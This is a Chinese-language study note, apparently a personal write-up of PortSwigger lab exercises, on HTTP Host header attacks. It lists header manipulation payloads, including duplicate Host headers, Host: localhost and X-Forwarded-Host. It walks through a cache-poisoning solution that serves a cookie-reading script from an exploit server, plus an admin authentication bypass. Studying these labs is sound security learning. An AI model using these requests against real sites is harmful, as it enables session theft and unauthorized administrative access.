---
title: HTTP Host header attacks
description: HTTP Host header attacks
---

## 前言

光是看標題就覺得超吸引我！

## 攻擊手法

### Port

```
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
```

### Domain

```
GET /example HTTP/1.1
Host: notvulnerable-website.com
```

### Subdomain

```
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com
```

### Double Host headers

```
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
```

### Absolute URL in HTTP Request Start Line

```
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

### Indent

```
GET /example HTTP/1.1
    Host: bad-stuff-here
Host: vulnerable-website.com
```

### X-Forwarded-Host, X-Host, X-Forwarded-Server, X-HTTP-Host-Override, Forwarded

```
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here
```

補充，這在 [Web cache poisoning](./web-cache-poisoning.md) 的章節也有提到

## Lab: Web cache poisoning via ambiguous requests

| Dimension | Description                                                                                                            |
| --------- | ---------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/host-header/exploiting#web-cache-poisoning-via-the-host-header                    |
| Lab       | https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests |

先用 Burp Suite Repeater，觀察正常的 HTTP Request 跟 Response

Request

```
GET / HTTP/1.1
Host: 0a3600d3043f9f5f8071036c00c000d7.h1-web-security-academy.net
Cookie: session=CBkKLZ9HhcdYIHyStoQeEzZ0uXdNdFz4; _lab=46%7cMCwCFAavorc2RuuNk5TOoN4sBzoAPWOSAhQy6nke9VJs65Ko30mZecU7BWIvmBQGB7ZgklKnIGdWteyIGZrDrKJsBdgHZ2L6ztzw4oCs5bEaFGBGnuCnbFPPunxdwt%2fbaN%2bW4udri%2bmX7g6xstCi9wk6ZJKCB%2beLb6Zh78hWsYfchsPA%2fI8%3d
```

Response

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 10968
```

經過 [Web cache poisoning](./web-cache-poisoning.md) 的洗禮，現在知道 Request Headers 要帶 `Cookie`，Server 才不會回傳 `Set-Cookie`，導致 Response 無法被快取

嘗試加 [Port](#port)，`Host: 0a3600d3043f9f5f8071036c00c000d7.h1-web-security-academy.net:123`，看到

```html
<script
  type="text/javascript"
  src="//0a3600d3043f9f5f8071036c00c000d7.h1-web-security-academy.net:123/resources/js/tracking.js"
></script>
```

瀏覽器重整後．確實有 Cache Poisoning

先在 exploit-server 設定

```
/resources/js/tracking.js

HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8

alert(document.cookie)
```

但可惜換成數字以外就會 500 Internal Server Error

```html
<h4>Internal Server Error</h4>
<p class="is-warning">No host found</p>
```

嘗試第二招 [Double Host headers](#double-host-headers)

```
Host: 0a3600d3043f9f5f8071036c00c000d7.h1-web-security-academy.net
Host: exploit-0a03006204969f11807e027801e6005b.exploit-server.net
```

成功解題～

## Exploiting classic server-side vulnerabilities

https://portswigger.net/web-security/host-header/exploiting#exploiting-classic-server-side-vulnerabilities

```
For example, you should try the usual SQL injection probing techniques via the Host header. If the value of the header is passed into a SQL statement, this could be exploitable.
```

有點不直觀的黑箱 SQLi 測試 Entry Point，正常都是搜尋功能的參數，但還是先記在心裡～

## Lab: Host header authentication bypass

| Dimension | Description                                                                                       |
| --------- | ------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/host-header/exploiting#accessing-restricted-functionality    |
| Lab       | https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass |

直接用 Burp Suite Repeater 嘗試

```
GET / HTTP/2
Host: localhost
```

看到

```html
<a href="/admin">Admin panel</a>
```

接著就

```
GET /admin HTTP/2
Host: localhost
```

然後

```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
```

成功通關～

## Accessing internal websites with virtual host brute-forcing

https://portswigger.net/web-security/host-header/exploiting#accessing-internal-websites-with-virtual-host-brute-forcing

假設一台 Server 有 Host 一個 Public 網站 跟一個 Private 網站

```
www.example.com: 12.34.56.78
intranet.example.com: 10.0.0.132
```

如果攻擊者能夠知道 `intranet.example.com`，不管是透過

1. DNS Record
2. [Information disclosure](./information-disclosure.md)
3. subdomain brute-force

就能訪問 Server 內部的其他服務了，但這跟 [SSRF](./cross-site-requesy-forgery.md) 不一樣，SSRF 是 Client → Server → Other Server (outbound)

## Routing-based SSRF

https://portswigger.net/web-security/host-header/exploiting#routing-based-ssrf

假設有 Client `<=>` Reverse Proxy `<=>` Original Server 的架構

如果發送以下 HTTP Request 給 Reverse Proxy

```
GET / HTTP/1.1
Host: Other-Internal-Server
```

Reverse Proxy 真的把 HTTP Request 轉發到 Other-Internal-Server 的話，這樣就算是 Routing-based SSRF

## Lab: Routing-based SSRF

| Dimension | Description                                                                                    |
| --------- | ---------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/host-header/exploiting#routing-based-ssrf                 |
| Lab       | https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf |

## 參考資料

- https://portswigger.net/web-security/host-header
